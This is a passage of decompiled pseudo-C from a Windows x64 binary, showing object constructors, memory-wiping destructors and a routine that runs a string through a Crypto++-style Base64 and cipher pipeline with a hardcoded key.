// 1400B0968: using guessed type __int64 (__fastcall *off_1400B0968)(void *);
// 1400B0A08: using guessed type __int64 (__fastcall *off_1400B0A08)();
// 1400B0A78: using guessed type __int64 (__fastcall *off_1400B0A78[6])();

//----- (000000014007A980) ----------------------------------------------------
_QWORD *__fastcall sub_14007A980(__int64 a1, __int64 a2, unsigned __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  unsigned __int64 v5; // rbp
  __int64 v6; // rsi
  _QWORD *v7; // r14
  _QWORD *v8; // rdi
  __int64 v9; // rax
  __int64 v10; // rax
  char v12; // [rsp+20h] [rbp-88h]
  __int64 v13; // [rsp+28h] [rbp-80h]
  __int64 v14; // [rsp+30h] [rbp-78h]
  unsigned __int64 v15; // [rsp+40h] [rbp-68h]
  void *Memory; // [rsp+48h] [rbp-60h]
  __int64 v17; // [rsp+50h] [rbp-58h]
  __int64 v18; // [rsp+58h] [rbp-50h]
  char v19; // [rsp+60h] [rbp-48h]
  void (__fastcall ***v20)(_QWORD, signed __int64); // [rsp+68h] [rbp-40h]

  v18 = -2i64;
  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = (_QWORD *)a1;
  v17 = a1;
  v8 = (_QWORD *)(a1 + 104);
  sub_14007ADD0(a1 + 104);
  *v8 = &off_1400B04E0;
  v8[1] = off_1400B0558;
  sub_14007AB00(v7);
  *v7 = &off_1400B06B8;
  v7[1] = &off_1400B0758;
  v7[6] = off_1400B07C8;
  v7[2] = v8;
  v9 = (*(unsigned int (**)(void))(v8[1] + 32i64))();
  v15 = 0i64;
  Memory = 0i64;
  v13 = v4;
  v14 = v9;
  v12 = 0;
  v10 = sub_140036C20((__int64)&v19, (__int64)&unk_1400A8AA0, (__int64)&v12, 1);
  sub_140039240((__int64)v7, v6, v5, v10);
  if ( v20 )
    (**v20)(v20, 1i64);
  memset(Memory, 0, v15);
  free(Memory);
  return v7;
}
// 1400B04E0: using guessed type __int64 (__fastcall *off_1400B04E0)(void *);
// 1400B0558: using guessed type __int64 (__fastcall *off_1400B0558[2])();
// 1400B06B8: using guessed type __int64 (__fastcall *off_1400B06B8)(void *);
// 1400B0758: using guessed type __int64 (__fastcall *off_1400B0758)();
// 1400B07C8: using guessed type __int64 (__fastcall *off_1400B07C8[6])();

//----- (000000014007AA90) ----------------------------------------------------
_QWORD *__fastcall sub_14007AA90(_QWORD *a1)
{
  _QWORD *v1; // rdi

  v1 = a1;
  sub_140036DA0((__int64)(a1 + 1), 1);
  v1[2] = 0i64;
  v1[4] = 0i64;
  v1[5] = 0i64;
  v1[8] = 0i64;
  v1[9] = 0i64;
  *v1 = &off_1400B0810;
  v1[1] = &off_1400B08B0;
  v1[6] = off_1400B0920;
  return v1;
}
// 1400B0810: using guessed type __int64 (__fastcall *off_1400B0810)(void *);
// 1400B08B0: using guessed type __int64 (__fastcall *off_1400B08B0)();
// 1400B0920: using guessed type __int64 (__fastcall *off_1400B0920[6])();

//----- (000000014007AB00) ----------------------------------------------------
_QWORD *__fastcall sub_14007AB00(_QWORD *a1)
{
  _QWORD *v1; // rdi

  v1 = a1;
  sub_140036DA0((__int64)(a1 + 1), 1);
  v1[2] = 0i64;
  v1[4] = 0i64;
  v1[5] = 0i64;
  v1[8] = 0i64;
  v1[9] = 0i64;
  *v1 = &off_1400B05A8;
  v1[1] = &off_1400B0648;
  v1[6] = off_1400B0920;
  return v1;
}
// 1400B05A8: using guessed type __int64 (__fastcall *off_1400B05A8)(void *);
// 1400B0648: using guessed type __int64 (__fastcall *off_1400B0648)();
// 1400B0920: using guessed type __int64 (__fastcall *off_1400B0920[6])();

//----- (000000014007AB70) ----------------------------------------------------
__int64 __fastcall sub_14007AB70(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  __int64 v3; // rbx
  const void *v4; // r8

  *(_BYTE *)(a1 + 4097) = 0;
  v2 = *(_QWORD *)(a2 + 4104);
  v3 = a1;
  *(_QWORD *)(a1 + 4104) = v2;
  if ( *(_QWORD *)(a2 + 4104) > 0x400ui64 || *(_BYTE *)(a1 + 4097) )
    a1 = 0i64;
  else
    *(_BYTE *)(a1 + 4097) = 1;
  *(_QWORD *)(v3 + 4112) = a1;
  v4 = *(const void **)(a2 + 4112);
  if ( v4 )
    memcpy_s((void *)a1, 4 * v2, v4, 4i64 * *(_QWORD *)(a2 + 4104));
  return v3;
}

//----- (000000014007ABF0) ----------------------------------------------------
_QWORD *__fastcall sub_14007ABF0(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rbx
  _QWORD *v3; // rdi
  void *v4; // rax

  v2 = a2;
  v3 = a1;
  v4 = sub_140087480();
  sub_14004DF00((__int64)v3, (__int64)v4, 6, v2);
  *v3 = &off_1400B0348;
  v3[1] = off_1400B04C8;
  return v3;
}
// 1400B0348: using guessed type __int64 (__fastcall *off_1400B0348)(void *);
// 1400B04C8: using guessed type __int64 (__fastcall *off_1400B04C8[3])();

//----- (000000014007AC40) ----------------------------------------------------
_QWORD *__fastcall sub_14007AC40(_QWORD *a1, __int64 a2, char a3, int a4)
{
  _QWORD *v4; // rbx
  void *v5; // rax
  __int64 v6; // rdi
  _QWORD *v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  char v11; // [rsp+48h] [rbp-30h]
  void (__fastcall ***v12)(_QWORD, signed __int64); // [rsp+50h] [rbp-28h]
  char v13; // [rsp+90h] [rbp+18h]
  int v14; // [rsp+98h] [rbp+20h]

  v14 = a4;
  v13 = a3;
  v4 = a1;
  v5 = operator new(0x68ui64);
  v6 = (__int64)v5;
  if ( v5 )
  {
    v7 = operator new(0x70ui64);
    if ( v7 )
      v7 = sub_14007AEC0((__int64)v7, 0i64);
    v5 = (void *)sub_14007AE50(v6, (__int64)v7);
  }
  sub_140057C60((__int64)v4, (__int64)v5);
  *v4 = &off_1400B0188;
  v4[1] = off_1400AC9B0;
  v8 = sub_14007A7E0((__int64)&v11, (__int64)"InsertLineBreaks", &v13, 1);
  v9 = sub_140022A10(v8, (__int64)"MaxLineLength", &v14, *(_BYTE *)(v8 + 16));
  sub_1400874D0((__int64)v4, v9);
  if ( v12 )
    (**v12)(v12, 1i64);
  return v4;
}
// 1400AC9B0: using guessed type __int64 (__fastcall *off_1400AC9B0[3])();
// 1400B0188: using guessed type __int64 (__fastcall *off_1400B0188)(void *);

//----- (000000014007AD40) ----------------------------------------------------
__int64 __fastcall sub_14007AD40(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi
  void *v4; // rcx
  _WORD *v5; // rax
  __int64 v6; // rax
  const void *v7; // r8

  v2 = a2;
  v3 = a1;
  v4 = 0i64;
  v5 = (_WORD *)(a2 + 16);
  if ( !a2 )
    v5 = 0i64;
  *(_WORD *)(v3 + 16) = *v5;
  *(_BYTE *)(v3 + 97) = 0;
  v6 = *(_QWORD *)(a2 + 104);
  *(_QWORD *)(v3 + 104) = v6;
  if ( *(_QWORD *)(a2 + 104) <= 0x12ui64 && !*(_BYTE *)(v3 + 97) )
  {
    *(_BYTE *)(v3 + 97) = 1;
    v4 = (void *)(v3 + 24);
  }
  *(_QWORD *)(v3 + 112) = v4;
  v7 = *(const void **)(a2 + 112);
  if ( v7 )
    memcpy_s(v4, 4 * v6, v7, 4i64 * *(_QWORD *)(a2 + 104));
  sub_14007AB70(v3 + 120, v2 + 120);
  return v3;
}

//----- (000000014007ADD0) ----------------------------------------------------
__int64 __fastcall sub_14007ADD0(__int64 a1)
{
  __int64 v1; // rbx
  signed __int64 v2; // rcx
  signed __int64 v3; // rax

  v1 = a1;
  sub_140036DA0(a1 + 8, 1);
  *(_BYTE *)(v1 + 97) = 0;
  *(_QWORD *)(v1 + 104) = 18i64;
  if ( *(_BYTE *)(v1 + 97) )
  {
    v2 = 0i64;
  }
  else
  {
    *(_BYTE *)(v1 + 97) = 1;
    v2 = v1 + 24;
  }
  v3 = v1 + 120;
  *(_QWORD *)(v1 + 112) = v2;
  *(_BYTE *)(v3 + 4097) = 0;
  *(_QWORD *)(v3 + 4104) = 1024i64;
  if ( *(_BYTE *)(v1 + 4217) )
  {
    *(_QWORD *)(v1 + 4232) = 0i64;
  }
  else
  {
    *(_BYTE *)(v1 + 4217) = 1;
    *(_QWORD *)(v1 + 4232) = v1 + 120;
  }
  return v1;
}

//----- (000000014007AE50) ----------------------------------------------------
__int64 __fastcall sub_14007AE50(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140057900(a1, 0i64);
  *(_QWORD *)v3 = &off_1400AFE60;
  *(_QWORD *)(v3 + 8) = off_1400AFFE0;
  *(_QWORD *)(v3 + 48) = 0i64;
  *(_QWORD *)(v3 + 56) = 0i64;
  *(_QWORD *)(v3 + 64) = 0i64;
  *(_DWORD *)(v3 + 72) = 0;
  *(_QWORD *)(v3 + 88) = 0i64;
  *(_QWORD *)(v3 + 96) = 0i64;
  sub_1400589E0(v3, v2);
  return v3;
}
// 1400AFE60: using guessed type __int64 (__fastcall *off_1400AFE60)(void *);
// 1400AFFE0: using guessed type __int64 (__fastcall *off_1400AFFE0[3])();

//----- (000000014007AEC0) ----------------------------------------------------
_QWORD *__fastcall sub_14007AEC0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  _QWORD *v3; // rdi

  v2 = a2;
  v3 = (_QWORD *)a1;
  sub_140057900(a1, 0i64);
  *v3 = &off_1400AFFF8;
  v3[1] = off_1400B0170;
  v3[7] = 0i64;
  v3[8] = 0i64;
  v3[10] = 0i64;
  v3[11] = 0i64;
  v3[12] = 0i64;
  v3[13] = 0i64;
  sub_1400589E0((__int64)v3, v2);
  return v3;
}
// 1400AFFF8: using guessed type __int64 (__fastcall *off_1400AFFF8)(void *);
// 1400B0170: using guessed type __int64 (__fastcall *off_1400B0170[3])();

//----- (000000014007AF30) ----------------------------------------------------
_QWORD *__fastcall sub_14007AF30(__int64 a1, _QWORD *a2, char a3, __int64 a4)
{
  __int64 v4; // rdi
  char v5; // bp
  _QWORD *v6; // rsi
  _QWORD *v7; // rbx
  __int64 v8; // rax
  __int64 v9; // rdx
  __int64 v10; // rdx
  char v12; // [rsp+20h] [rbp-78h]
  _QWORD *v13; // [rsp+28h] [rbp-70h]
  __int64 v14; // [rsp+30h] [rbp-68h]
  unsigned __int64 v15; // [rsp+40h] [rbp-58h]
  void *Memory; // [rsp+48h] [rbp-50h]
  __int64 v17; // [rsp+50h] [rbp-48h]
  __int64 v18; // [rsp+58h] [rbp-40h]
  char v19; // [rsp+60h] [rbp-38h]
  void (__fastcall ***v20)(_QWORD, signed __int64); // [rsp+68h] [rbp-30h]

  v18 = -2i64;
  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = (_QWORD *)a1;
  v17 = a1;
  sub_140057900(a1, 0i64);
  sub_1400589E0((__int64)v7, v4);
  *v7 = &off_1400AAD38;
  v7[1] = off_1400AAED0;
  sub_14004E040((__int64)(v7 + 6), 0i64);
  *v7 = &off_1400AAD38;
  v7[1] = off_1400AAED0;
  v15 = 0i64;
  Memory = 0i64;
  v8 = v6[2];
  if ( v6[3] >= 0x10ui64 )
    v6 = (_QWORD *)*v6;
  v13 = v6;
  v14 = v8;
  v12 = 0;
  v9 = sub_140036C20((__int64)&v19, (__int64)"InputBuffer", (__int64)&v12, 1);
  (*(void (__fastcall **)(_QWORD *, __int64))(*v7 + 56i64))(v7, v9);
  if ( v5 )
  {
    LOBYTE(v10) = 1;
    (*(void (__fastcall **)(_QWORD *, __int64))(*v7 + 392i64))(v7, v10);
  }
  if ( v20 )
    (**v20)(v20, 1i64);
  memset(Memory, 0, v15);
  free(Memory);
  return v7;
}
// 1400AAD38: using guessed type __int64 (__fastcall *off_1400AAD38)(void *);
// 1400AAED0: using guessed type __int64 (__fastcall *off_1400AAED0[7])();

//----- (000000014007B050) ----------------------------------------------------
signed __int64 __fastcall sub_14007B050(__int64 a1)
{
  __int64 v1; // rbx
  __int64 v2; // rcx
  _DWORD *v3; // rdi
  signed __int64 result; // rax
  __int64 v5; // rcx
  _DWORD *v6; // rdi

  v1 = a1;
  sub_14007B1B0(a1);
  v2 = *(_QWORD *)(v1 + 4328);
  v3 = *(_DWORD **)(v1 + 4336);
  if ( v3 == (_DWORD *)(v1 + 224) )
  {
    *(_BYTE *)(v1 + 4321) = 0;
    while ( v2 )
    {
      *v3 = 0;
      ++v3;
      --v2;
    }
  }
  result = v1 + 128;
  v5 = *(_QWORD *)(v1 + 208);
  v6 = *(_DWORD **)(v1 + 216);
  if ( v6 == (_DWORD *)(v1 + 128) )
  {
    *(_BYTE *)(v1 + 201) = 0;
    result = 0i64;
    while ( v5 )
    {
      *v6 = 0;
      ++v6;
      --v5;
    }
  }
  return result;
}
// 14007B1B0: using guessed type __int64 __cdecl sub_14007B1B0(_QWORD);

//----- (000000014007B0C0) ----------------------------------------------------
signed __int64 __fastcall sub_14007B0C0(__int64 a1)
{
  __int64 v1; // rbx
  __int64 v2; // rcx
  _DWORD *v3; // rdi
  signed __int64 result; // rax
  __int64 v5; // rcx
  _DWORD *v6; // rdi

  v1 = a1;
  sub_14007B1B0(a1);
  v2 = *(_QWORD *)(v1 + 4328);
  v3 = *(_DWORD **)(v1 + 4336);
  if ( v3 == (_DWORD *)(v1 + 224) )
  {
    *(_BYTE *)(v1 + 4321) = 0;
    while ( v2 )
    {
      *v3 = 0;
      ++v3;
      --v2;
    }
  }
  result = v1 + 128;
  v5 = *(_QWORD *)(v1 + 208);
  v6 = *(_DWORD **)(v1 + 216);
  if ( v6 == (_DWORD *)(v1 + 128) )
  {
    *(_BYTE *)(v1 + 201) = 0;
    result = 0i64;
    while ( v5 )
    {
      *v6 = 0;
      ++v6;
      --v5;
    }
  }
  return result;
}
// 14007B1B0: using guessed type __int64 __cdecl sub_14007B1B0(_QWORD);

//----- (000000014007B130) ----------------------------------------------------
__int64 __fastcall sub_14007B130(__int64 a1)
{
  _DWORD *v1; // rdi
  __int64 v2; // rdx
  __int64 result; // rax
  __int64 i; // rcx

  v1 = *(_DWORD **)(a1 + 88);
  v2 = *(_QWORD *)(a1 + 80);
  if ( v1 == (_DWORD *)a1 )
  {
    *(_BYTE *)(a1 + 73) = 0;
    result = 0i64;
    for ( i = v2; i; --i )
    {
      *v1 = 0;
      ++v1;
    }
  }
  return result;
}

//----- (000000014007B160) ----------------------------------------------------
void __fastcall sub_14007B160(__int64 a1)
{
  unsigned __int64 v1; // rdx
  void *v2; // r8

  v1 = *(_QWORD *)(a1 + 32);
  v2 = *(void **)(a1 + 40);
  memset(*(void **)(a1 + 40), 0, *(_QWORD *)(a1 + 32));
  if ( v1 < 0x10 )
    free(v2);
  else
    aligned_free(v2);
}

//----- (000000014007B298) ----------------------------------------------------
void *__fastcall sub_14007B298(__int64 a1, char a2)
{
  return sub_14007B310((void *)(a1 - 8), a2);
}

//----- (000000014007B2A4) ----------------------------------------------------
void *__fastcall sub_14007B2A4(__int64 a1, char a2)
{
  return sub_14007B310((void *)(a1 - 48), a2);
}

//----- (000000014007B2B0) ----------------------------------------------------
void *__fastcall sub_14007B2B0(__int64 a1, char a2)
{
  return sub_14007B340((void *)(a1 - 8), a2);
}

//----- (000000014007B2BC) ----------------------------------------------------
void *__fastcall sub_14007B2BC(__int64 a1, char a2)
{
  return sub_14007B340((void *)(a1 - 48), a2);
}

//----- (000000014007B2C8) ----------------------------------------------------
void *__fastcall sub_14007B2C8(__int64 a1, char a2)
{
  return sub_14007B370((void *)(a1 - 8), a2);
}

//----- (000000014007B2D4) ----------------------------------------------------
void *__fastcall sub_14007B2D4(__int64 a1, char a2)
{
  return sub_14007B370((void *)(a1 - 48), a2);
}

//----- (000000014007B2E0) ----------------------------------------------------
_QWORD *__fastcall sub_14007B2E0(__int64 a1, char a2)
{
  return sub_14007B3A0((void *)(a1 - 8), a2);
}

//----- (000000014007B2EC) ----------------------------------------------------
void *__fastcall sub_14007B2EC(__int64 a1, char a2)
{
  return sub_14007B410((void *)(a1 - 8), a2);
}

//----- (000000014007B2F8) ----------------------------------------------------
_QWORD *__fastcall sub_14007B2F8(__int64 a1, char a2)
{
  return sub_14007B440((void *)(a1 - 8), a2);
}

//----- (000000014007B304) ----------------------------------------------------
void *__fastcall sub_14007B304(__int64 a1, char a2)
{
  return sub_14007B4B0((void *)(a1 - 8), a2);
}

//----- (000000014007B310) ----------------------------------------------------
void *__fastcall sub_14007B310(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_14007B050((__int64)a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (000000014007B340) ----------------------------------------------------
void *__fastcall sub_14007B340(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_14007B0C0((__int64)a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (000000014007B370) ----------------------------------------------------
void *__fastcall sub_14007B370(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_14007B1B0(a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 14007B1B0: using guessed type __int64 __cdecl sub_14007B1B0(_QWORD);

//----- (000000014007B3A0) ----------------------------------------------------
_QWORD *__fastcall sub_14007B3A0(void *a1, char a2)
{
  char v2; // si
  _QWORD *v3; // rbx
  void *v4; // r8
  void (__fastcall ***v5)(_QWORD, signed __int64); // rcx

  v2 = a2;
  v3 = a1;
  v4 = (void *)*((_QWORD *)a1 + 12);
  memset(*((void **)a1 + 12), 0, *((_QWORD *)a1 + 11));
  free(v4);
  v5 = (void (__fastcall ***)(_QWORD, signed __int64))v3[3];
  if ( v5 )
    (**v5)(v5, 1i64);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (000000014007B410) ----------------------------------------------------
void *__fastcall sub_14007B410(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140058150((__int64)a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (000000014007B440) ----------------------------------------------------
_QWORD *__fastcall sub_14007B440(void *a1, char a2)
{
  char v2; // si
  _QWORD *v3; // rbx
  void *v4; // r8
  void (__fastcall ***v5)(_QWORD, signed __int64); // rcx

  v2 = a2;
  v3 = a1;
  v4 = (void *)*((_QWORD *)a1 + 12);
  memset(*((void **)a1 + 12), 0, *((_QWORD *)a1 + 11));
  free(v4);
  v5 = (void (__fastcall ***)(_QWORD, signed __int64))v3[3];
  if ( v5 )
    (**v5)(v5, 1i64);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (000000014007B4B0) ----------------------------------------------------
void *__fastcall sub_14007B4B0(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_14007B220();
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 14007B220: using guessed type __int64 sub_14007B220(void);

//----- (000000014007B4E0) ----------------------------------------------------
_QWORD *__fastcall sub_14007B4E0(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx

  v2 = a2;
  sub_14007BF70(a2);
  return v2;
}

//----- (000000014007B510) ----------------------------------------------------
_QWORD *__fastcall sub_14007B510(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx

  v2 = a2;
  sub_14007C080(a2);
  return v2;
}

//----- (000000014007B540) ----------------------------------------------------
_QWORD *__fastcall sub_14007B540(__int64 a1, _QWORD *a2)
{
  size_t v2; // rbx
  _QWORD *v3; // rsi
  _QWORD *v4; // rax
  _BYTE *v5; // rdi
  void *Src; // [rsp+28h] [rbp-30h]
  __int64 v8; // [rsp+38h] [rbp-20h]
  unsigned __int64 v9; // [rsp+40h] [rbp-18h]

  v2 = 0i64;
  v3 = a2;
  v4 = sub_14007BBB0(&Src);
  v5 = v4;
  if ( v4[3] >= 0x10ui64 )
    v5 = (_BYTE *)*v4;
  if ( v9 >= 0x10 )
    operator delete(Src);
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(Src) = 0;
  v3[3] = 15i64;
  v3[2] = 0i64;
  *(_BYTE *)v3 = 0;
  if ( *v5 )
  {
    v2 = -1i64;
    do
      ++v2;
    while ( v5[v2] );
  }
  sub_140004F20(v3, v5, v2);
  return v3;
}

//----- (000000014007B600) ----------------------------------------------------
signed __int64 sub_14007B600()
{
  return 8i64;
}

//----- (000000014007B610) ----------------------------------------------------
bool __fastcall sub_14007B610(__int64 a1)
{
  return *(_DWORD *)(a1 + 32) == *(_DWORD *)(a1 - 16);
}

//----- (000000014007B620) ----------------------------------------------------
__int64 __fastcall sub_14007B620(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v5; // rdi
  char v6; // al
  __int64 v7; // rdx
  unsigned int v9; // [rsp+30h] [rbp+8h]

  v4 = a1;
  v5 = a2;
  (*(void (__fastcall **)(_QWORD, __int64, __int64, __int64))(**(_QWORD **)(a1 - 32) + 48i64))(
    *(_QWORD *)(a1 - 32),
    a3,
    a4,
    a2);
  (*(void (__fastcall **)(__int64))(*(_QWORD *)(v4 - 48) + 128i64))(v4 - 48);
  v6 = (*(__int64 (__fastcall **)(__int64, const char *, int *, unsigned int *))(*(_QWORD *)v5 + 8i64))(
         v5,
         "FeedbackSize",
         &int `RTTI Type Descriptor',
         &v9);
  v7 = 0i64;
  if ( v6 )
    v7 = v9;
  return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)(v4 - 48) + 120i64))(v4 - 48, v7);
}
// 1400D8D00: using guessed type int int `RTTI Type Descriptor';

//----- (000000014007B6A0) ----------------------------------------------------
_QWORD *__fastcall sub_14007B6A0(__int64 a1, _QWORD *a2, _QWORD *a3, __int64 *a4)
{
  _QWORD *v4; // rbx

  v4 = a2;
  sub_14007B740(a1, a2, a3, a4, 1);
  return v4;
}

//----- (000000014007B6D0) ----------------------------------------------------
signed __int64 __fastcall sub_14007B6D0(__int64 a1)
{
  __int64 v1; // rdi
  _QWORD *v2; // rax
  _QWORD *v3; // rbx
  signed __int64 result; // rax

  v1 = a1;
  v2 = operator new(0x1090ui64);
  v3 = v2;
  if ( v2 )
  {
    sub_14007AD40((__int64)v2, v1 - 8);
    *v3 = &off_1400B04E0;
    v3[1] = off_1400B0558;
  }
  else
  {
    v3 = 0i64;
  }
  if ( v3 )
    result = (signed __int64)(v3 + 1);
  else
    result = 0i64;
  return result;
}
// 1400B04E0: using guessed type __int64 (__fastcall *off_1400B04E0)(void *);
// 1400B0558: using guessed type __int64 (__fastcall *off_1400B0558[2])();

//----- (000000014007B740) ----------------------------------------------------
_QWORD *__fastcall sub_14007B740(__int64 a1, _QWORD *a2, _QWORD *a3, __int64 *a4, char a5)
{
  __int64 v5; // rax
  _QWORD *v6; // r12
  _QWORD *v7; // rbx
  unsigned __int64 v8; // r8
  _QWORD *v9; // rax
  __int64 v10; // r15
  _QWORD *v11; // rax
  _QWORD *v12; // r14
  _QWORD *v13; // rax
  _QWORD *v14; // rdi
  void *v15; // rdx
  unsigned __int64 v16; // rdx
  void *v17; // r8
  char *v18; // rdi
  __int64 i; // rcx
  char *v20; // rdi
  __int64 v21; // rcx
  _QWORD *v22; // rax
  _QWORD *v23; // r14
  _QWORD *v24; // rax
  __int64 v25; // r15
  _QWORD *v26; // rax
  _QWORD *v27; // rdi
  void *v28; // rdx
  unsigned __int64 v29; // rdx
  void *v30; // r8
  char *v31; // rdi
  __int64 j; // rcx
  unsigned __int64 v33; // rdx
  __int64 Src; // [rsp+60h] [rbp-22B8h]
  __int64 v36; // [rsp+70h] [rbp-22A8h]
  unsigned __int64 v37; // [rsp+78h] [rbp-22A0h]
  char v38; // [rsp+80h] [rbp-2298h]
  void (__fastcall ***v39)(_QWORD, signed __int64); // [rsp+98h] [rbp-2280h]
  char v40; // [rsp+F0h] [rbp-2228h]
  char v41; // [rsp+F8h] [rbp-2220h]
  unsigned __int64 v42; // [rsp+110h] [rbp-2208h]
  void *v43; // [rsp+118h] [rbp-2200h]
  unsigned __int64 v44; // [rsp+130h] [rbp-21E8h]
  void *Memory; // [rsp+138h] [rbp-21E0h]
  char v46; // [rsp+170h] [rbp-21A8h]
  __int64 v47; // [rsp+1C0h] [rbp-2158h]
  char *v48; // [rsp+1C8h] [rbp-2150h]
  char v49; // [rsp+1D0h] [rbp-2148h]
  __int64 v50; // [rsp+11D8h] [rbp-1140h]
  char *v51; // [rsp+11E0h] [rbp-1138h]
  char v52; // [rsp+11E8h] [rbp-1130h]
  char v53; // [rsp+11F0h] [rbp-1128h]
  unsigned __int64 v54; // [rsp+1208h] [rbp-1110h]
  void *v55; // [rsp+1210h] [rbp-1108h]
  unsigned __int64 v56; // [rsp+1228h] [rbp-10F0h]
  void *v57; // [rsp+1230h] [rbp-10E8h]
  char v58; // [rsp+1268h] [rbp-10B0h]
  __int64 v59; // [rsp+12B8h] [rbp-1060h]
  char *v60; // [rsp+12C0h] [rbp-1058h]
  char v61; // [rsp+12C8h] [rbp-1050h]
  __int64 v62; // [rsp+22D0h] [rbp-48h]
  char *v63; // [rsp+22D8h] [rbp-40h]
  int v64; // [rsp+22E0h] [rbp-38h]
  int v65; // [rsp+22E4h] [rbp-34h]

  v5 = (__int64)a4;
  v6 = a3;
  v7 = a2;
  if ( !a3[2] || (v8 = a4[2]) == 0 )
  {
    a2[3] = 15i64;
    a2[2] = 0i64;
    *(_BYTE *)a2 = 0;
    sub_140004F20(a2, byte_1400A3400, 0i64);
    return v7;
  }
  v37 = 15i64;
  v36 = 0i64;
  LOBYTE(Src) = 0;
  v64 = 1981354277;
  v65 = 1931018761;
  if ( (unsigned __int64)a4[3] >= 0x10 )
    v5 = *a4;
  if ( a5 )
  {
    sub_14007A980((__int64)&v40, v5, v8, (__int64)&v64);
    v9 = operator new(0xB8ui64);
    v10 = (__int64)v9;
    if ( v9 )
    {
      v11 = operator new(0x90ui64);
      v12 = v11;
      if ( v11 )
      {
        v13 = operator new(0x20ui64);
        v14 = v13;
        if ( v13 )
        {
          sub_140036DA0((__int64)v13, 0);
          *v14 = &off_1400AABD8;
          v14[1] = off_1400A9A98;
          v14[3] = &Src;
        }
        else
        {
          v14 = 0i64;
        }
        v11 = sub_14007AC40(v12, (__int64)v14, 0, 72);
      }
      v9 = sub_140057D20(v10, (__int64)&v41, (__int64)v11, 4);
    }
    sub_14007AF30((__int64)&v38, v6, 1, (__int64)v9);
    if ( v39 )
      (**v39)(v39, 1i64);
    v15 = Memory;
    memset(Memory, 0, v44);
    free(v15);
    v16 = v42;
    v17 = v43;
    memset(v43, 0, v42);
    if ( v16 < 0x10 )
      free(v17);
    else
      aligned_free(v17);
    v18 = v51;
    if ( v51 == &v49 )
    {
      for ( i = v50; i; --i )
      {
        *(_DWORD *)v18 = 0;
        v18 += 4;
      }
    }
    v20 = v48;
    if ( v48 != &v46 )
      goto LABEL_44;
    v21 = v47;
  }
  else
  {
    sub_14007A870((__int64)&v52, v5, v8, (__int64)&v64);
    v22 = operator new(0x68ui64);
    v23 = v22;
    if ( v22 )
    {
      v24 = operator new(0xB8ui64);
      v25 = (__int64)v24;
      if ( v24 )
      {
        v26 = operator new(0x20ui64);
        v27 = v26;
        if ( v26 )
        {
          sub_140036DA0((__int64)v26, 0);
          *v27 = &off_1400AABD8;
          v27[1] = off_1400A9A98;
          v27[3] = &Src;
        }
        else
        {
          v27 = 0i64;
        }
        v24 = sub_140057D20(v25, (__int64)&v53, (__int64)v27, 4);
      }
      v22 = sub_14007ABF0(v23, (__int64)v24);
    }
    sub_14007AF30((__int64)&v38, v6, 1, (__int64)v22);
    if ( v39 )
      (**v39)(v39, 1i64);
    v28 = v57;
    memset(v57, 0, v56);
    free(v28);
    v29 = v54;
    v30 = v55;
    memset(v55, 0, v54);
    if ( v29 < 0x10 )
      free(v30);
    else
      aligned_free(v30);
    v31 = v63;
    if ( v63 == &v61 )
    {
      for ( j = v62; j; --j )
      {
        *(_DWORD *)v31 = 0;
        v31 += 4;
      }
    }
    v20 = v60;
    if ( v60 != &v58 )
      goto LABEL_44;
    v21 = v59;
  }
  while ( v21 )
  {
    *(_DWORD *)v20 = 0;
    v20 += 4;
    --v21;
  }
LABEL_44:
  v7[3] = 15i64;
  v7[2] = 0i64;
  *(_BYTE *)v7 = 0;
  v33 = v37;
  if ( v37 >= 0x10 )
  {
    *v7 = Src;
  }
  else if ( v36 != -1 )
  {
    memmove(v7, &Src, v36 + 1);
    v33 = v37;
  }
  v7[2] = v36;
  v7[3] = v33;
  return v7;
}
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();
// 1400AABD8: using guessed type __int64 (__fastcall *off_1400AABD8)();

//----- (000000014007BB80) ----------------------------------------------------
__int64 __fastcall sub_14007BB80(__int64 a1)
{
  return (*(__int64 (__fastcall **)(signed __int64))(*(_QWORD *)(*(_QWORD *)(a1 - 32) + 8i64) + 40i64))(*(_QWORD *)(a1 - 32) + 8i64);
}

//----- (000000014007BB90) ----------------------------------------------------
signed __int64 __fastcall sub_14007BB90(__int64 a1)
{
  signed __int64 result; // rax

  if ( a1 )
    result = a1 + 48;
  else
    result = 0i64;
  return result;
}

//----- (000000014007BBA0) ----------------------------------------------------
unsigned __int64 __fastcall sub_14007BBA0(__int64 a1)
{
  return *(_QWORD *)(a1 - 8) + *(unsigned int *)(a1 - 16) - (unsigned __int64)*(unsigned int *)(a1 + 32);
}

//----- (000000014007BBB0) ----------------------------------------------------
_QWORD *__fastcall sub_14007BBB0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
